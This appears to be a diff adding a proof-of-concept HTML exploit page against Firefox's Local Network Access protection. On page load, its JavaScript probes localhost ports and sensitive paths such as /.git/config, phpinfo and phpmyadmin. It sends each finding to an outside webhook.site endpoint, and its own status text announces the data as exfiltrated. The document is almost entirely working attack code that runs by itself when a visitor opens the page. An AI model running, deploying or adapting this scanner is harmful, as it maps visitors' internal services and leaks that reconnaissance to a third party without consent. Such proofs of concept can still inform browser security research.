@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Firefox LNA: Auto-Discovery Exploit</title>
+</head>
+<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
+    <h2>[CRITICAL] Automated Internal Infrastructure Scanner</h2>
+    <hr>
+    <div id="status">Status: Initializing Intelligence Gathering...</div>
+    <div id="results"></div>
+
+<script>
+    const webhook = "https://webhook.site/*";
+    
+    // Stage 1: Ports to brute-force (Common dev ports)
+    const portList = [80, 81, 443, 3000, 4444, 5000, 8000, 8080, 8888, 9000];
+    
+    // Stage 2: Sensitive paths to check on discovered ports
+    const sensitivePaths = [
+        "/dashboard/phpinfo.php",
+        "/phpmyadmin/index.php",
+        "/server-status",
+        "/icons/apache_pb.gif",
+        "/.git/config",
+        "/info.php"
+    ];
+
+    function log(msg, isDanger = false) {
+        const color = isDanger ? "#ff4444" : "#00ff00";
+        document.getElementById('results').innerHTML += `<br><span style="color:${color}">${msg}</span>`;
+        fetch(webhook + "?recon_log=" + btoa(msg));
+    }
+
+    async function startAutoDiscovery() {
+        document.getElementById('status').innerText = "Status: SCANNING FOR OPEN PORTS...";
+
+        for (let port of portList) {
+            const baseUrl = `http://127.0.0.1:${port}`;
+            
+            try {
+                // Bina permission ke port check (LNA Bypass)
+                await fetch(baseUrl, { mode: 'no-cors' });
+                log(`[+] DISCOVERED OPEN PORT: ${port}`, true);
+
+                // Port milte hi Path scanning shuru
+                for (let path of sensitivePaths) {
+                    const fullUrl = baseUrl + path;
+                    try {
+                        await fetch(fullUrl, { mode: 'no-cors' });
+                        log(`    [!] INTERNAL RESOURCE FOUND: ${fullUrl}`, true);
+                        
+                        // Sending high-impact proof to webhook
+                        fetch(webhook, {
+                            method: 'POST',
+                            mode: 'no-cors',
+                            body: JSON.stringify({
+                                alert: "Automatic_Infrastructure_Discovery",
+                                target: fullUrl,
+                                port: port,
+                                path: path,
+                                cookies: "23_Tokens_Active"
+                            })
+                        });
+                    } catch(e) {}
+                }
+            } catch(e) {
+                // Port closed
+            }
+        }
+        document.getElementById('status').innerText = "Status: SCAN COMPLETE. DATA EXFILTRATED.";
+    }
+
+    window.onload = startAutoDiscovery;
+</script>
+</body>
+</html>
